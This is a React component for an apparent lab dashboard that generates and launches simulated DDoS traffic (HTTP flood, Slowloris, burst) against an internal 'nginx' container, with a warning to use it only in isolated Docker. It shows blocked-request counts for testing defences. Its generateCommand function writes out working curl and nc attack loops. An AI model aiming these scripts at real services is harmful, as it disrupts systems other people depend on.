import React, { useState, useEffect } from 'react';
import api from '../../api';

// 각 공격 타입에 해당하는 터미널 명령어 생성
function generateCommand(type, rps, concurrency, duration) {
  switch (type) {
    case 'flood':
      return `# HTTP Flood Attack - ${rps} req/s, ${concurrency} concurrent connections
for i in $(seq 1 ${rps * duration}); do
  curl -s -o /dev/null -w "%{http_code}" http://nginx:80/api/health &
  [ $(( i % ${concurrency} )) -eq 0 ] && wait
  sleep $(echo "scale=3; 1/${rps}" | bc)
done
echo "Flood complete: sent ${rps * duration} requests"`;

    case 'slowloris':
      return `# Slowloris Attack - ${concurrency} slow connections for ${duration}s
for i in $(seq 1 ${concurrency}); do
  (while true; do
    echo -ne "GET /api/health HTTP/1.1\\r\\nHost: nginx\\r\\n" | \\
    nc -q ${duration} nginx 80 &
    sleep 2
  done) &
done
sleep ${duration}
kill %- 2>/dev/null
echo "Slowloris complete"`;

    case 'burst':
      return `# Burst Attack - ${concurrency * 10} requests per burst, 5s intervals
for round in $(seq 1 $(( ${duration} / 5 ))); do
  echo "=== Burst round $round ==="
  for i in $(seq 1 ${concurrency * 10}); do
    curl -s -o /dev/null -w "%{http_code} " http://nginx:80/api/health &
  done
  wait
  echo ""
  sleep 5
done
echo "Burst complete"`;

    default:
      return `echo "Unknown attack type: ${type}"`;
  }
}

function DDoSControl({ onSendCommand, terminalMode }) {
  const [type, setType] = useState('flood');
  const [rps, setRps] = useState(10);
  const [concurrency, setConcurrency] = useState(5);
  const [duration, setDuration] = useState(30);
  const [running, setRunning] = useState(false);
  const [simStatus, setSimStatus] = useState(null);
  const [collapsed, setCollapsed] = useState(false);

  useEffect(() => {
    if (!running) return;
    const interval = setInterval(() => {
      api.get('/traffic/simulate/status').then(res => {
        setSimStatus(res.data);
        if (!res.data.running) setRunning(false);
      }).catch(() => {});
    }, 1000);
    return () => clearInterval(interval);
  }, [running]);

  const handleStart = async () => {
    if (terminalMode) {
      // 터미널 모드: 명령어를 터미널에 전송
      const cmd = generateCommand(type, rps, concurrency, duration);
      if (onSendCommand) onSendCommand(cmd);
      return;
    }

    // 바이패스 모드: API로 직접 시뮬레이션 시작
    try {
      await api.post('/traffic/simulate/start', { type, rps, concurrency, duration_sec: duration });
      setRunning(true);

      // 터미널에도 해당 명령어 표시
      if (onSendCommand) {
        const cmd = generateCommand(type, rps, concurrency, duration);
        onSendCommand(`# [바이패스 모드] 아래 명령어가 실행되었습니다:\n${cmd}`);
      }
    } catch (e) {
      console.error('Simulation start failed:', e);
    }
  };

  const handleStop = async () => {
    try {
      await api.post('/traffic/simulate/stop');
      setRunning(false);
      if (onSendCommand) {
        onSendCommand('# Simulation stopped');
      }
    } catch (e) {
      console.error('Simulation stop failed:', e);
    }
  };

  return (
    <div className="ddos-control">
      <div className="ddos-header" onClick={() => setCollapsed(!collapsed)}>
        <span>{collapsed ? '▶' : '▼'}</span>
        <span className="ddos-title">DDoS Simulation</span>
        {running && <span className="ddos-running-indicator" />}
      </div>

      {!collapsed && (
        <div className="ddos-body">
          <div className="ddos-warning">
            ⚠️ 이 기능은 격리된 Docker 환경 내에서만 사용하세요
          </div>

          <div className="ddos-controls">
            <div className="control-group">
              <label>Attack Type</label>
              <select value={type} onChange={e => setType(e.target.value)} disabled={running}>
                <option value="flood">HTTP Flood</option>
                <option value="slowloris">Slowloris</option>
                <option value="burst">Burst</option>
              </select>
            </div>

            <div className="control-group">
              <label>RPS: {rps}</label>
              <input
                type="range"
                min="1"
                max="100"
                value={rps}
                onChange={e => setRps(parseInt(e.target.value))}
                disabled={running}
              />
            </div>

            <div className="control-group">
              <label>Concurrency: {concurrency}</label>
              <input
                type="range"
                min="1"
                max="50"
                value={concurrency}
                onChange={e => setConcurrency(parseInt(e.target.value))}
                disabled={running}
              />
            </div>

            <div className="control-group">
              <label>Duration: {duration}s</label>
              <input
                type="range"
                min="5"
                max="120"
                value={duration}
                onChange={e => setDuration(parseInt(e.target.value))}
                disabled={running}
              />
            </div>
          </div>

          <div className="ddos-actions">
            {!running ? (
              <button className="btn-attack" onClick={handleStart}>
                {terminalMode ? '📝 터미널에 명령어 전송' : '⚡ 시뮬레이션 시작'}
              </button>
            ) : (
              <button className="btn-stop" onClick={handleStop}>
                ⏹ 중지
              </button>
            )}
          </div>

          {running && simStatus && (
            <div className="ddos-status">
              <div className="status-row">
                <span>Type:</span><span>{simStatus.type}</span>
              </div>
              <div className="status-row">
                <span>Sent:</span><span>{simStatus.total_sent}</span>
              </div>
              <div className="status-row">
                <span>Blocked:</span><span style={{ color: '#ff4444' }}>{simStatus.total_blocked}</span>
              </div>
              <div className="status-row">
                <span>Elapsed:</span><span>{simStatus.elapsed_sec}s</span>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

export default DDoSControl;
